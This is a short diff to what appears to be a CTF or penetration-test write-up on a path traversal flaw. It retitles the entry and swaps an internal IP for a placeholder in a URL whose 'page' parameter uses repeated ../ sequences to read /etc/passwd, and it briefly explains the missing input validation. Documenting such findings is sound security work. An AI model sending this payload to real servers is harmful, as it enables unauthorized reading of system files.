@@ -1,6 +1,6 @@
-# Path traversal
+# Page param path traversal
 
-http://10.12.250.190/?page=/../../../../../../../../../../../../../../etc/passwd
+`http://<ip>/?page=/../../../../../../../../../../../../../../etc/passwd`
 
 The application includes files dynamically based on the page parameter without proper validation. By manipulating this parameter with directory traversal sequences (../), an attacker can access sensitive files on the server, such as /etc/passwd.
 
